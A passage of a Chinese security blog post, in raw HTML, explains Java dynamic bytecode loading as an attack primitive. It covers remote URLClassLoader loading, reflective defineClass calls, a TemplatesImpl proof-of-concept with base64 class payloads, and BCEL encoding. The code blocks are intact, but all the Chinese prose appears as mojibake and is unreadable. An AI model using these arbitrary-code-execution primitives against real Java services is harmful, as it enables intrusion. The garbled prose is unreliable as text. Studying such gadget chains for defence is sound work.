class="hljs-operator">=</span> URLClassLoader.newInstance(urls);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> loader.loadClass(<span class="hljs-string">&quot;Hello&quot;</span>);<br>        c.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ç¼–è¯‘ä¸€ä¸ªç®€å•çš„HelloWorldç¨‹åºï¼Œæ”¾åœ¨<a href="http://localhost:8000/Hello.class%EF%BC%9A">http://localhost:8000/Hello.classï¼š</a></p><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730003225504.png" alt="image-20240730003225504"></p><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730003325045.png" alt="image-20240730003325045"></p><p>æˆåŠŸè¯·æ±‚åˆ°æˆ‘ä»¬çš„<code>/Hello.class</code>æ–‡ä»¶ï¼Œå¹¶æ‰§è¡Œäº†æ–‡ä»¶é‡Œçš„å­—èŠ‚ç ï¼Œè¾“å‡ºâ€Hello Worldâ€ã€‚</p><p>æ‰€ä»¥ï¼Œä½œä¸ºæ”»å‡»è€…ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶ç›®æ ‡<code>Java ClassLoader</code>çš„åŸºç¡€è·¯å¾„ä¸ºä¸€ä¸ªhttpæœåŠ¡å™¨ï¼Œåˆ™å¯ä»¥<strong>åˆ©ç”¨è¿œç¨‹åŠ è½½çš„æ–¹å¼æ‰§è¡Œä»»æ„ä»£ç </strong>äº†ã€‚</p><h2 id="åˆ©ç”¨-ClassLoader-defineClass-ç›´æ¥åŠ è½½å­—èŠ‚ç "><a href="#åˆ©ç”¨-ClassLoader-defineClass-ç›´æ¥åŠ è½½å­—èŠ‚ç " class="headerlink" title="åˆ©ç”¨ ClassLoader#defineClass ç›´æ¥åŠ è½½å­—èŠ‚ç "></a>åˆ©ç”¨ ClassLoader#defineClass ç›´æ¥åŠ è½½å­—èŠ‚ç </h2><p>å…¶å®ä¸ç®¡æ˜¯åŠ  è½½è¿œç¨‹classæ–‡ä»¶ï¼Œè¿˜æ˜¯æœ¬åœ°çš„classæˆ–jaræ–‡ä»¶ï¼ŒJavaéƒ½ç»å†çš„æ˜¯ä¸‹é¢è¿™ä¸‰ä¸ªæ–¹æ³•è°ƒç”¨ï¼š</p><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730002859489.png" alt="image-20240730002859489"></p><p>å…¶ä¸­ï¼š </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Â·loadClass çš„ä½œç”¨æ˜¯ä»å·²åŠ è½½çš„ç±»ç¼“å­˜ã€çˆ¶åŠ è½½å™¨ç­‰ä½ç½®å¯»æ‰¾ç±»ï¼ˆè¿™é‡Œå®é™…ä¸Šæ˜¯åŒäº²å§”æ´¾æœºåˆ¶ï¼‰ï¼Œåœ¨å‰é¢æ²¡æœ‰æ‰¾åˆ°çš„æƒ…å†µä¸‹ï¼Œæ‰§è¡Œ findClass <br>Â·findClass çš„ä½œç”¨æ˜¯æ ¹æ®åŸºç¡€URLæŒ‡å®šçš„æ–¹å¼æ¥åŠ è½½ç±»çš„å­—èŠ‚ç ï¼Œå¯èƒ½ä¼šåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿã€jaråŒ…æˆ–è¿œç¨‹httpæœåŠ¡å™¨ä¸Šè¯»å–å­—èŠ‚ç ï¼Œç„¶åäº¤ç»™ defineClass <br>Â·defineClass çš„ä½œç”¨æ˜¯å¤„ç†å‰é¢ä¼ å…¥çš„å­—èŠ‚ç ï¼Œå°†å…¶å¤„ç†æˆçœŸæ­£çš„Javaç±»<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥å¯è§ï¼ŒçœŸæ­£æ ¸å¿ƒçš„éƒ¨åˆ†å…¶å®æ˜¯ <code>defineClass</code> ï¼Œä»–å†³å®šäº†å¦‚ä½•å°†ä¸€æ®µå­—èŠ‚æµè½¬å˜æˆä¸€ä¸ªJavaç±»ï¼ŒJava é»˜è®¤çš„ <code>ClassLoader#defineClass</code> æ˜¯ä¸€ä¸ª<code>native</code>æ–¹æ³•ï¼Œé€»è¾‘åœ¨JVMçš„Cè¯­è¨€ä»£ç ä¸­ã€‚ </p><p>æˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸€ä¸ªç®€å•çš„ä»£ç ï¼Œæ¥æ¼”ç¤ºå¦‚ä½•è®©ç³»ç»Ÿçš„ <code>defineClass</code> æ¥ç›´æ¥åŠ è½½å­—èŠ‚ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloDefineClass</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">defineClass</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>        defineClass.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="hljs-string">&quot;Hello&quot;</span>, code, <span class="hljs-number">0</span>, code.length);<br>        hello.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„ä¸€ç‚¹ï¼Œåœ¨ <code>defineClass</code> è¢«è°ƒç”¨çš„æ—¶å€™ï¼Œç±»å¯¹è±¡æ˜¯ä¸ä¼šè¢«åˆå§‹åŒ–çš„ï¼Œåªæœ‰è¿™ä¸ªå¯¹è±¡æ˜¾å¼åœ°è°ƒç”¨å…¶æ„é€ å‡½æ•°ï¼Œåˆå§‹åŒ–ä»£ç æ‰èƒ½è¢«æ‰§è¡Œã€‚</p><p>è€Œä¸”ï¼Œå³ä½¿æˆ‘ä»¬å°†åˆå§‹åŒ–ä»£ç æ”¾åœ¨ç±»çš„<code>static</code>å—ä¸­ï¼Œåœ¨ <code>defineClass</code> æ—¶ä¹Ÿæ— æ³•è¢«ç›´æ¥è°ƒç”¨åˆ°ã€‚</p><p>æ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬è¦ä½¿ç”¨<code>defineClass</code>åœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œéœ€è¦æƒ³åŠæ³•è°ƒç”¨æ„é€ å‡½æ•°ã€‚  </p><p>æ‰§è¡Œä¸Šè¿°exampleï¼Œè¾“å‡ºäº†Hello Worldï¼š</p><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730003751282.png" alt="image-20240730003751282"></p><p>è¿™é‡Œï¼Œå› ä¸ºç³»ç»Ÿçš„<code>ClassLoader#defineClass</code>æ˜¯ä¸€ä¸ªä¿æŠ¤å±æ€§ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•ç›´æ¥åœ¨å¤–éƒ¨è®¿é—®ï¼Œä¸å¾—ä¸ä½¿ç”¨åå°„çš„å½¢å¼æ¥è°ƒç”¨ã€‚ </p><p>åœ¨å®é™…åœºæ™¯ä¸­ï¼Œå› ä¸º<code>defineClass</code>æ–¹æ³•ä½œç”¨åŸŸæ˜¯ä¸å¼€æ”¾çš„ï¼Œæ‰€ä»¥æ”»å‡»è€…å¾ˆå°‘èƒ½ç›´æ¥åˆ©ç”¨åˆ°å®ƒï¼Œä½†å®ƒå´æ˜¯æˆ‘ä»¬å¸¸ç”¨çš„ä¸€ä¸ªæ”»å‡»é“¾<code>TemplatesImpl</code>çš„åŸºçŸ³ã€‚</p><h2 id="åˆ©ç”¨-TemplatesImpl-åŠ è½½å­—èŠ‚ç "><a href="#åˆ©ç”¨-TemplatesImpl-åŠ è½½å­—èŠ‚ç " class="headerlink" title="åˆ©ç”¨ TemplatesImpl åŠ è½½å­—èŠ‚ç "></a>åˆ©ç”¨ TemplatesImpl åŠ è½½å­—èŠ‚ç </h2><p>é‡å¤´æˆæ¥äº†ã€‚</p><p>è™½ç„¶å¤§éƒ¨åˆ†ä¸Šå±‚å¼€å‘è€…ä¸ä¼šç›´æ¥ä½¿ç”¨åˆ°<code>defineClass</code>æ–¹æ³•ï¼Œä½†æ˜¯Javaåº•å±‚è¿˜æ˜¯æœ‰ä¸€äº›ç±»ç”¨åˆ°äº†å®ƒï¼ˆå¦åˆ™ä»–ä¹Ÿæ²¡å­˜åœ¨çš„ä»·å€¼äº†ï¼‰ï¼Œè¿™å°±æ˜¯<code>TemplatesImpl</code>ã€‚ </p><p>å¼•å…¥ä¸€ä¸ªç©æ„ï¼š</p><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>è¿™ä¸ªç±»ä¸­å®šä¹‰äº†ä¸€ä¸ªå†…éƒ¨ç±»:</p><p><code>TransletClassLoader</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransletClassLoader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;<br>    TransletClassLoader(ClassLoader parent) &#123;<br>        <span class="hljs-built_in">super</span>(parent);<br>        _loadedExternalExtensionFunctions = <span class="hljs-literal">null</span>;<br>    &#125;<br>    <br>    TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) &#123;<br>        <span class="hljs-built_in">super</span>(parent);<br>        _loadedExternalExtensionFunctions = mapEF;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        Class&lt;?&gt; ret = <span class="hljs-literal">null</span>;<br>        <span class="hljs-comment">// The _loadedExternalExtensionFunctions will be empty when the</span><br>        <span class="hljs-comment">// SecurityManager is not set and the FSP is turned off</span><br>        <span class="hljs-keyword">if</span> (_loadedExternalExtensionFunctions != <span class="hljs-literal">null</span>) &#123;<br>            ret = _loadedExternalExtensionFunctions.get(name);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (ret == <span class="hljs-literal">null</span>) &#123;<br>            ret = <span class="hljs-built_in">super</span>.loadClass(name);<br>        &#125;<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Access to final protected superclass member from outer class.</span><br><span class="hljs-comment">     */</span><br>     Class <span class="hljs-title function_">defineClass</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] b)</span> &#123;<br>        <span class="hljs-keyword">return</span> defineClass(<span class="hljs-literal">null</span>, b, <span class="hljs-number">0</span>, b.length);<br>    &#125;<br> &#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªç±»é‡Œé‡å†™äº†<code>defineClass</code>æ–¹æ³•ï¼Œå¹¶ä¸”è¿™é‡Œæ²¡æœ‰æ˜¾å¼åœ°å£°æ˜å…¶å®šä¹‰åŸŸã€‚</p><p>Javaä¸­é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœä¸€ä¸ªæ–¹æ³•æ²¡æœ‰æ˜¾å¼å£°æ˜ä½œç”¨åŸŸï¼Œå…¶ä½œç”¨åŸŸä¸º<code>default</code>ã€‚</p><p>æ‰€ä»¥ä¹Ÿå°±æ˜¯è¯´è¿™é‡Œçš„<code>defineClass</code>ç”±å…¶çˆ¶ç±»çš„<code>protected</code>ç±»å‹å˜æˆäº†ä¸€ä¸ª<code>default</code>ç±»å‹çš„æ–¹æ³•ï¼Œå¯ä»¥è¢«ç±»å¤–éƒ¨è°ƒç”¨ã€‚</p><p>æˆ‘ä»¬ä»<code>TransletClassLoader#defineClass()</code>å‘å‰è¿½æº¯ä¸€ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">TemplatesImpl#getOutputProperties() -&gt; <br>TemplatesImpl#newTransformer() -&gt; <br>TemplatesImpl#getTransletInstance() -&gt; <br>TemplatesImpl#defineTransletClasses() -&gt; <br>TransletClassLoader#defineClass()<br></code></pre></td></tr></table></figure><p>è¿½åˆ°æœ€å‰é¢ä¸¤ä¸ªæ–¹æ³•<code>TemplatesImpl#getOutputProperties()</code>ã€ <code>TemplatesImpl#newTransformer()</code>ï¼Œè¿™ä¸¤è€…çš„ä½œç”¨åŸŸæ˜¯<code>public</code>ï¼Œå¯ä»¥è¢«å¤–éƒ¨è°ƒç”¨ã€‚æˆ‘ä»¬å°è¯•ç”¨ <code>newTransformer()</code>æ„é€ ä¸€ä¸ªç®€å•çš„POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">// source: bytecodes/HelloTemplateImpl.java</span><br>    <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&quot;</span>);<br>    <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>    setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>    setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>    setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>    <br>    obj.newTransformer();<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ<code>setFieldValue</code>æ–¹æ³•ç”¨æ¥è®¾ç½®ç§æœ‰å±æ€§ï¼Œå¯è§è¿™é‡Œè®¾ç½®äº†ä¸‰ä¸ªå±æ€§ï¼š</p><p><code>_bytecodes</code>ã€<code>_name</code> å’Œ<code>_tfactory</code>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Â·_bytecodesæ˜¯ç”±å­—èŠ‚ç ç»„æˆçš„æ•°ç»„ï¼›<br><br>Â·_nameå¯ä»¥æ˜¯ä»»æ„å­—ç¬¦ä¸²ï¼Œåªè¦ä¸ä¸º<span class="hljs-literal">null</span>å³å¯ï¼›<br><br>Â·_tfactoryéœ€è¦æ˜¯ä¸€ä¸ªTransformerFactoryImplå¯¹è±¡ï¼Œå› ä¸º TemplatesImpl#defineTransletClasses()æ–¹æ³•é‡Œæœ‰è°ƒç”¨åˆ°_tfactory.getExternalExtensionsMap()ï¼Œå¦‚æœæ˜¯<span class="hljs-literal">null</span>ä¼šå‡ºé”™ã€‚ <br></code></pre></td></tr></table></figure><p>å¦å¤–å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œ<code>TemplatesImpl</code>ä¸­å¯¹åŠ è½½çš„å­—èŠ‚ç æ˜¯æœ‰ä¸€å®šè¦æ±‚çš„ï¼š</p><p>è¿™ä¸ªå­—èŠ‚ç å¯¹åº”çš„ç±»å¿…é¡»æ˜¯<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>çš„å­ç±»ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸ªç‰¹æ®Šçš„ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloTemplatesImpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <br><span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-title function_">HelloTemplatesImpl</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        System.out.println(<span class="hljs-string">&quot;Hello TemplatesImpl&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å®ƒç»§æ‰¿äº† <code>AbstractTranslet</code> ç±»ï¼Œå¹¶åœ¨æ„é€ å‡½æ•°é‡Œæ’å…¥<code>Hello</code>çš„è¾“å‡ºã€‚</p><p>å°†å…¶ç¼–è¯‘æˆå­—èŠ‚ç ï¼Œå³å¯è¢« <code>TemplatesImpl</code> æ‰§è¡Œäº†ï¼š</p><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730005336767.png" alt="image-20240730005336767"></p><h2 id="åˆ©ç”¨BCEL-ClassLoaderåŠ è½½å­—èŠ‚ç "><a href="#åˆ©ç”¨BCEL-ClassLoaderåŠ è½½å­—èŠ‚ç " class="headerlink" title="åˆ©ç”¨BCEL ClassLoaderåŠ è½½å­—èŠ‚ç "></a>åˆ©ç”¨BCEL ClassLoaderåŠ è½½å­—èŠ‚ç </h2><p>è‹¥æˆ‘ä»¬è®¤ä¸ºæ‰€æœ‰èƒ½å¤Ÿæ¢å¤æˆä¸€ä¸ªç±»å¹¶åœ¨JVMè™šæ‹Ÿæœºé‡ŒåŠ è½½çš„å­—èŠ‚åºåˆ—éƒ½åœ¨æˆ‘ä»¬çš„æ¢è®¨èŒƒå›´å†…ã€‚ </p><p>é‚£ä¹ˆï¼Œ<strong>BCELå­—èŠ‚ç </strong>ä¹Ÿå¿…ç„¶åœ¨æˆ‘ä»¬çš„è®¨è®ºèŒƒå›´å†…ï¼Œä¸”å æ®ç€æ¯”è¾ƒé‡è¦çš„åœ°ä½ã€‚ </p><p><code>BCEL</code>çš„å…¨ååº”è¯¥æ˜¯<code>Apache Commons BCEL</code>ï¼Œå±äº<code>Apache Commons</code>é¡¹ç›®ä¸‹çš„ä¸€ä¸ªå­é¡¹ç›®ï¼Œ</p><p>ä½†å…¶å› ä¸ºè¢«<code>Apache Xalan</code>æ‰€ä½¿ç”¨ï¼Œè€Œ<code>Apache Xalan</code>åˆæ˜¯Javaå†…éƒ¨å¯¹äºJAXPçš„å®ç°ï¼Œæ‰€ä»¥BCELä¹Ÿè¢«åŒ…å«åœ¨äº†JDKçš„åŸç”Ÿåº“ä¸­ã€‚ </p><p>å…³äºBCELçš„è¯¦ç»†ä»‹ç»ï¼Œè¯·é˜…è¯»pç‰›å†™çš„å¦ä¸€ç¯‡æ–‡ç« ã€Š<a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">BCEL ClassLoader</a>å»å“ªäº†ã€‹ï¼Œå»ºè®®é˜…è¯»å®Œè¿™ç¯‡æ–‡ç« å†æ¥é˜…è¯»ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡BCELæä¾›çš„ä¸¤ä¸ªç±»<code>Repository</code>å’Œ<code>Utility</code>æ¥åˆ©ç”¨ï¼š</p><p><code>Repository</code>ç”¨äºå°†ä¸€ä¸ª<code>Java Class</code>å…ˆè½¬æ¢æˆåŸç”Ÿå­—èŠ‚ç ï¼Œå½“ç„¶è¿™é‡Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨<code>javac</code>å‘½ä»¤æ¥ç¼–è¯‘javaæ–‡ä»¶ç”Ÿæˆå­—èŠ‚ç ï¼›</p><p><code>Utility</code>ç”¨äºå°†åŸç”Ÿçš„å­—èŠ‚ç è½¬æ¢æˆBCELæ ¼å¼çš„å­—èŠ‚ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloBCEL</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String []args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">JavaClass</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> Repository.lookupClass(evil.Hello.class);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(cls.getBytes(), <span class="hljs-literal">true</span>);<br>        System.out.println(code);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730005943078.png" alt="image-20240730005943078"></p><p>å‰é¢åŠ ä¸ª<code>$$BCEL$$</code>æ ‡è¯†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloBCEL</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String 